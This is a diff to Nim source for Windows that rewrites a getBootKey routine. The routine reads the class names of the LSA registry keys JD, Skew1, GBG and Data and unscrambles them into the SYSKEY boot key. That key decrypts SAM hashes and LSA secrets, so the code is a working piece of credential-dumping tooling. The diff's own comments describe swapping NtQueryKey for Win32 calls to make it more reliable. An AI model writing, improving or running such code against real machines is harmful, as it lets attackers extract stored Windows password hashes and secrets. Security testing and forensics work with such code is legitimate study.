@@ -421,46 +421,35 @@ when defined(windows):
   # ============================================================
 
   proc getBootKey(): tuple[key: seq[byte], error: string] =
+    ## Retrieves the boot key (syskey) from the class names of LSA registry keys.
+    ## Uses Win32 RegOpenKeyExW + RegQueryInfoKeyW instead of NtQueryKey to avoid
+    ## STATUS_INVALID_PARAMETER (0xC000000D) issues on certain Windows builds.
+    ## The SYSTEM hive is readable by any admin, so no backup_restore bypass needed.
     var
-      keyValue: string
-      regHandle: HANDLE
-      bufferSize: ULONG
-      returnValue: NTSTATUS
-      buffer: seq[byte]
+      hKey: HKEY
+      classBuffer: array[256, WCHAR]
+      classSize: DWORD
       returnBuffer: seq[byte] = newSeq[byte](16)
       scrambledByteArray: seq[byte]
-      keyClassInfoPtr: PKEY_NODE_INFORMATION
-      pClass: ptr UncheckedArray[WCHAR]
-      classCharLen: ULONG
       classStr: string = ""
     let permutationMatrix = [byte 0x8, 0x5, 0x4, 0x2, 0xb, 0x9, 0xd, 0x3, 0x0, 0x6, 0x1, 0xc, 0xe, 0xa, 0xf, 0x7]
     let keyLocations = ["JD", "Skew1", "GBG", "Data"]
-    let mainRegLocation = "\\Registry\\Machine\\SYSTEM\\CurrentControlSet\\Control\\Lsa\\"
+    let mainRegLocation = "SYSTEM\\CurrentControlSet\\Control\\Lsa\\"
     for keyLocation in keyLocations:
-      keyValue = mainRegLocation & keyLocation
-      let (handle, success) = openRegistryWithNtOpenKeyEx(keyValue)
-      if not success:
-        return (@[], "Failed to open registry key: " & keyValue)
-      regHandle = handle
-      bufferSize = 0
-      returnValue = NtQueryKeyProc(regHandle, KeyNodeInformation, NULL, 0, addr bufferSize)
-      if bufferSize == 0:
-        discard NtCloseProc(regHandle)
-        return (@[], "Failed to read buffer size for " & keyValue & " (NTSTATUS: 0x" & returnValue.uint32.toHex(8) & ")")
-      # Allocate with safety margin to handle slight size variations between calls
-      let allocSize = bufferSize + 64
-      buffer = newSeq[byte](allocSize)
-      var resultLen: ULONG = 0
-      returnValue = NtQueryKeyProc(regHandle, KeyNodeInformation, cast[PVOID](addr buffer[0]), allocSize, addr resultLen)
-      discard NtCloseProc(regHandle)
-      if returnValue != 0:
-        return (@[], "Failed to get value for " & keyValue & " (NTSTATUS: 0x" & returnValue.uint32.toHex(8) & ")")
-      keyClassInfoPtr = cast[PKEY_NODE_INFORMATION](addr buffer[0])
-      if keyClassInfoPtr.ClassLength > 0:
-        pClass = cast[ptr UncheckedArray[WCHAR]](cast[uint64](addr buffer[0]) + cast[uint64](keyClassInfoPtr.ClassOffset))
-        classCharLen = keyClassInfoPtr.ClassLength div cast[ULONG](sizeof(WCHAR))
-        for i in 0 ..< classCharLen.int:
-          classStr.add(cast[char](pClass[i]))
+      let keyValue = mainRegLocation & keyLocation
+      let wideKeyValue = newWideCString(keyValue)
+      var openStatus = RegOpenKeyExW(HKEY_LOCAL_MACHINE, wideKeyValue, 0, KEY_READ, addr hKey)
+      if openStatus != 0:
+        return (@[], "Failed to open registry key: " & keyValue & " (Win32 error: " & $openStatus & ")")
+      classSize = 256
+      var infoStatus = RegQueryInfoKeyW(hKey, addr classBuffer[0], addr classSize, nil, nil, nil, nil, nil, nil, nil, nil, nil)
+      RegCloseKey(hKey)
+      if infoStatus != 0:
+        return (@[], "Failed to query key class for: " & keyValue & " (Win32 error: " & $infoStatus & ")")
+      if classSize == 0:
+        return (@[], "Key has empty class name: " & keyValue)
+      for i in 0 ..< classSize.int:
+        classStr.add(cast[char](classBuffer[i]))
     scrambledByteArray = hexStringToByteArray(classStr)
     for i in countup(0, 15):
       returnBuffer[i] = scrambledByteArray[permutationMatrix[i]]
